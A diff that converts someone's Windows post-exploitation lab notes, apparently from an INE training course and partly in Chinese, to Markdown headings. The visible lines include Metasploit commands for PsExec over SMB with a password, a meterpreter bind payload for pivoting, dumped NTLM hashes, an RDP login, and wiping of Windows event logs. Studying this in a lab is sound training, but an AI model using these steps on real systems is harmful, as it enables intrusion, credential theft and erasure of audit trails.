@@ -1,7 +1,5 @@
-Windows Post Exploitation
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows Post Exploitation Modules
-
+# Windows Post Exploitation
+## Windows Post Exploitation Modules
 	nmap -sV -p80 demo.ine.local
 	80/tcp open  http    HttpFileServer httpd 2.3
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -78,8 +76,7 @@ Windows Post Exploitation Modules
 	[*]     Path: C:\Windows\system32\spool\drivers
 	[*]     Remark: Printer Drivers
 	[*]     Type: DISK
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-UAC Bypass: Memory Injection(Metasploit)
+## UAC Bypass: Memory Injection(Metasploit)
 	nmap -sV -p80 demo.ine.local
 	80/tcp open  http    HttpFileServer httpd 2.3
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -149,8 +146,7 @@ UAC Bypass: Memory Injection(Metasploit)
 	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 	
 	管理員 NTLM 哈希： f168d9f8e6c5b893b8c4dfa202228235
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Exploiting SMB With PsEcec
+## Exploiting SMB With PsEcec
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -168,8 +164,7 @@ Exploiting SMB With PsEcec
 	set SMBUser Administrator
 	set SMBPass qwertyuiop
 	exploit
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Window: Enabling Remote Desktop
+## Window: Enabling Remote Desktop
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC demo.ine.local
 	80/tcp    open  http         BadBlue httpd 2.7
@@ -198,8 +193,7 @@ Window: Enabling Remote Desktop
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	xfreerdp /u:administrator /p:hacker_123321 /v:demo.ine.local
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Clearing Windows Event logs
+## Clearing Windows Event logs
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC demo.ine.local
 	80/tcp    open  http               BadBlue httpd 
@@ -216,8 +210,7 @@ Clearing Windows Event logs
 	[*] Wiping 510 records from System...
 	[*] Wiping 15902 records from Security...
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Pivoting
+## Pivoting
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ping demo2.ine.local
 	PING demo2.ine.local (10.0.31.80) 56(84) bytes of data.
@@ -265,9 +258,8 @@ Pivoting
 	set PAYLOAD windows/meterpreter/bind_tcp
 	set RHOSTS demo2.ine.local
 	exploit
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Metasploit GUIs
-Port Scanning and Enumeration with Armitage
+# Metasploit GUIs
+## Port Scanning and Enumeration with Armitage
 	=> Armitage 是 Metasploit 的圖形化網路攻擊管理工具
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	啟動 postgresql 資料庫服務 : 
@@ -292,8 +284,7 @@ Port Scanning and Enumeration with Armitage
 	Services
 	=> 查看目標系統上執行的開放連接埠和服務
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Exploitation and Post Exploitation with Armitage
+## Exploitation and Post Exploitation with Armitage
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	將從上一個實驗中停止的地方繼續
 	rejetto
@@ -309,5 +300,4 @@ Exploitation and Post Exploitation with Armitage
 
 	[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
 	[+] 	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
